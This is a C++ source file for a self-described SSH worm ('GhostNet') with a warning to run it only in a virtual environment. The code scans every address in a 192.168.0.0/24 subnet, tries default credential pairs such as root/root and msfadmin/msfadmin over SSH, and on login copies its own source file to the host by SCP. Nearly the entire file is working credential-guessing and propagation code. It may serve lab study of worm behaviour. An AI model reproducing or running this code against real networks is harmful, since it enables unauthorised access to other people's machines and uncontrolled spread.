//Start Date: 24-09-2024
// Copyright © by Dodda Sai Prudhvi Raja 2024-2025. All rights reserved.
// Use of this source code is governed by Apache 2 LICENSE which can be found in the LICENSE file.
//WARNING!!
//This worm can only used in virtual env, please don't try to run this on your personal or work system this can spread through your network

#include <libssh/libssh.h>  // SSH for secure connection with Target and interrupt it.
#include <libssh/sftp.h>    // SFTP library for file transfer.
#include <iostream>         // For input-output operations 
#include <fstream>          // For file operations (used to calculate file size dynamically)
#include <vector>           // Using vectors to store data
#include <sstream>          // For string stream operations to parse IP addresses

// Dracula class 
class Dracula {
private:
    std::string vampire;   // Store network address as a string

public:
    // Constructor to initialize the network address
    Dracula(const std::string& vampire_address) : vampire(vampire_address) {}

    // Function to generate IP addresses on the network (assuming subnet 255.255.255.0)
    std::vector<std::string> blood_suction() {
        std::vector<std::string> white_teeth;   // To store generated IP addresses
        std::istringstream ss(vampire);         // String stream to parse network address
        std::string part;                       // Temporary variable to hold each part of the IP
        std::vector<std::string> tokens;        // To hold the split parts of the IP

        // Split the network IP string into tokens (e.g., 192.168.0.0 -> ["192", "168", "0", "0"])
        while (std::getline(ss, part, '.')) {
            tokens.push_back(part);
        }

        // Generate IP addresses on the network (e.g., 192.168.0.1 to 192.168.0.255)
        for (int i = 1; i < 256; i++) {
            std::ostringstream host;
            host << tokens[0] << "." << tokens[1] << "." << tokens[2] << "." << i;
            white_teeth.push_back(host.str());  // Append the generated address to the list
        }

        return white_teeth;  // Return the list of IP addresses 😁
    }

    // Function to return a list of SSH credentials to try
    std::vector<std::pair<std::string, std::string>> get_credentials() {
        return {{"user", "user"}, {"root", "root"}, {"msfadmin", "msfadmin"}};  // Default credentials 
    }

    // Function to get file size for dynamic file transfer
    size_t get_file_size(const std::string& filename) {
        std::ifstream in(filename, std::ifstream::ate | std::ifstream::binary);
        return in.tellg();  // Get file size
    }

    // Function to spread the worm using SSH
    void spread_via_ssh() {
        ssh_session my_ssh_session;  // SSH session variable
        ssh_scp scp_session;         // SCP session variable for file transfer
        int rc;                      // Return code to check SSH operations

        // For each IP in the generated network addresses
        for (const auto& remote_address : blood_suction()) {
            std::cout << "Trying to spread on the remote host: " << remote_address << std::endl;

            // For each credential set
            for (const auto& cred : get_credentials()) {
                my_ssh_session = ssh_new();  // Create new SSH connection session
                if (my_ssh_session == NULL) {  // Check if session creation was successful
                    continue;
                }

                ssh_options_set(my_ssh_session, SSH_OPTIONS_HOST, remote_address.c_str());
                ssh_options_set(my_ssh_session, SSH_OPTIONS_USER, cred.first.c_str());
                rc = ssh_connect(my_ssh_session);  // Try connecting to the SSH host
                if (rc == SSH_OK) {         // If SSH connection is successful
                    rc = ssh_userauth_password(my_ssh_session, NULL, cred.second.c_str());  // Authenticate with password
                    if (rc == SSH_AUTH_SUCCESS) {  // If authentication is successful
                        std::cout << "Connected to " << remote_address << " with credentials " << cred.first << ":" << cred.second << std::endl;

                        // Initialize SCP session for file transfer
                        scp_session = ssh_scp_new(my_ssh_session, SSH_SCP_WRITE, ".");
                        if (scp_session != NULL) {  // If SCP session is successfully created
                            ssh_scp_init(scp_session);  // Initialize SCP

                            // Get file size dynamically
                            size_t file_size = get_file_size("GhostNet.cpp");
                           ssh_scp_push_file(scp_session, "GhostNet.cpp", file_size, S_IRUSR | S_IWUSR);  // Transfer worm file to the remote host
                            std::cout << "Worm file uploaded to the host" << std::endl;
                        }
                        ssh_scp_free(scp_session);  // Free SCP session resources
                    } else {
                        std::cout << "Authentication failed for " << remote_address << std::endl;
                    }
                } else {
                    std::cout << "SSH connection failed for " << remote_address << std::endl;
                }

                // Disconnect and free the SSH session
                ssh_disconnect(my_ssh_session);
                ssh_free(my_ssh_session);
            }
        }
    }
};

int main() {
    // Initialize dracula object with the network address "192.168.0.0"
    Dracula dracula("192.168.0.0"); // you can dynamically initialize the IP by using the cin function

    // Spread the worm via SSH connection on the network
    dracula.spread_via_ssh();

    return 0;
}
